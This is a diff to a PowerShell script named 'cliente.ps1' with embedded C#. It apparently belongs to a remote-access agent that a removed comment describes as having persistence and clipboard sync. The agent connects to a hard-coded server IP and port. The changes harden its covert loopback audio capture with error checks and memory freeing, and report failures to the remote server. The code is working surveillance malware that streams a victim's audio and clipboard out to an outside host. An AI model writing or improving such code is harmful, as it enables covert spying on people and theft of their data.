@@ -1,5 +1,4 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent + Persistencia + Clipboard Sync + Áudio Extensible + Novo Banner
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -161,6 +160,7 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalLock(IntPtr hMem);
         [DllImport("kernel32.dll", SetLastError = true)] public static extern bool GlobalUnlock(IntPtr hMem);
         [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalFree(IntPtr hMem);
+        [DllImport("ole32.dll")] public static extern void CoTaskMemFree(IntPtr pv);
 
         const uint CF_UNICODETEXT = 13;
         const uint GMEM_MOVEABLE = 2;
@@ -173,26 +173,34 @@ if (-not ("R9KAgent" -as [type])) {
 
         [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
         [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        interface IMMDeviceEnumerator { int NotImpl1(); int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice); }
+        interface IMMDeviceEnumerator { 
+            [PreserveSig] int NotImpl1(); 
+            [PreserveSig] int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice); 
+        }
         [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        interface IMMDevice { int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface); }
+        interface IMMDevice { 
+            [PreserveSig] int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface); 
+        }
         [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
         interface IAudioClient {
-            int Initialize(int shareMode, int streamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
-            int GetBufferSize(out uint pNumBufferFrames);
-            int GetStreamLatency(out long phnsLatency);
-            int GetCurrentPadding(out uint pNumPaddingFrames);
-            int IsFormatSupported(int shareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
-            int GetMixFormat(out IntPtr ppDeviceFormat);
-            int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
-            int Start(); int Stop(); int Reset(); int SetEventHandle(IntPtr eventHandle);
-            int GetService(ref Guid riid, out IAudioCaptureClient ppv);
+            [PreserveSig] int Initialize(int shareMode, int streamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
+            [PreserveSig] int GetBufferSize(out uint pNumBufferFrames);
+            [PreserveSig] int GetStreamLatency(out long phnsLatency);
+            [PreserveSig] int GetCurrentPadding(out uint pNumPaddingFrames);
+            [PreserveSig] int IsFormatSupported(int shareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
+            [PreserveSig] int GetMixFormat(out IntPtr ppDeviceFormat);
+            [PreserveSig] int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
+            [PreserveSig] int Start(); 
+            [PreserveSig] int Stop(); 
+            [PreserveSig] int Reset(); 
+            [PreserveSig] int SetEventHandle(IntPtr eventHandle);
+            [PreserveSig] int GetService(ref Guid riid, out IAudioCaptureClient ppv);
         }
         [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
         interface IAudioCaptureClient {
-            int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
-            int ReleaseBuffer(uint NumFramesRead);
-            int GetNextPacketSize(out uint pNumFramesInNextPacket);
+            [PreserveSig] int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
+            [PreserveSig] int ReleaseBuffer(uint NumFramesRead);
+            [PreserveSig] int GetNextPacketSize(out uint pNumFramesInNextPacket);
         }
 
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
@@ -437,23 +445,45 @@ if (-not ("R9KAgent" -as [type])) {
                 try {
                     IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                     IMMDevice device;
-                    enumerator.GetDefaultAudioEndpoint(0, 1, out device);
+                    int hr = enumerator.GetDefaultAudioEndpoint(0, 1, out device);
+                    if (hr != 0 || device == null) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo de audio padrao encontrado (PC sem placa de som ou desativado)."); }
+                        isAudioRunning = false; return;
+                    }
+
                     Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                     IAudioClient audioClient;
-                    device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient);
+                    hr = device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient);
+                    if (hr != 0 || audioClient == null) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao ativar o dispositivo de audio HR=" + hr.ToString("X")); }
+                        isAudioRunning = false; return;
+                    }
+
                     IntPtr pFormat;
-                    audioClient.GetMixFormat(out pFormat);
+                    hr = audioClient.GetMixFormat(out pFormat);
+                    if (hr != 0 || pFormat == IntPtr.Zero) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter formato de audio HR=" + hr.ToString("X")); }
+                        isAudioRunning = false; return;
+                    }
+
                     WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
                     
-                    int hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
+                    // 0x00080000 = AUDCLNT_STREAMFLAGS_LOOPBACK
+                    hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
                     if (hr != 0) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Initialize falhou hr=" + hr); }
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Driver de audio nao suporta Loopback (HR=0x" + hr.ToString("X") + ")"); }
+                        CoTaskMemFree(pFormat);
                         isAudioRunning = false; return;
                     }
                     
                     Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                     IAudioCaptureClient captureClient;
-                    audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
+                    hr = audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
+                    if (hr != 0 || captureClient == null) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter servico de captura HR=" + hr.ToString("X")); }
+                        CoTaskMemFree(pFormat);
+                        isAudioRunning = false; return;
+                    }
                     
                     audioClient.Start();
                     bool sentFmt = false;
@@ -461,10 +491,13 @@ if (-not ("R9KAgent" -as [type])) {
                     while (isAudioRunning && globalWriter != null) {
                         Thread.Sleep(10);
                         uint packetSize;
-                        captureClient.GetNextPacketSize(out packetSize);
+                        hr = captureClient.GetNextPacketSize(out packetSize);
+                        if (hr != 0) { Thread.Sleep(100); continue; }
+                        
                         while (packetSize > 0 && isAudioRunning) {
                             IntPtr pData; uint numFrames; uint flags; ulong pos, qpc;
-                            captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
+                            hr = captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
+                            if (hr != 0) break;
                             
                             if (numFrames > 0) {
                                 int bytes = (int)(numFrames * wfx.nBlockAlign);
@@ -499,10 +532,12 @@ if (-not ("R9KAgent" -as [type])) {
                                 }
                             }
                             captureClient.ReleaseBuffer(numFrames);
-                            captureClient.GetNextPacketSize(out packetSize);
+                            hr = captureClient.GetNextPacketSize(out packetSize);
+                            if (hr != 0) break;
                         }
                     }
                     audioClient.Stop();
+                    CoTaskMemFree(pFormat);
                 } catch (Exception ex) {
                     lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: " + ex.Message); }
                 } finally { isAudioRunning = false; }
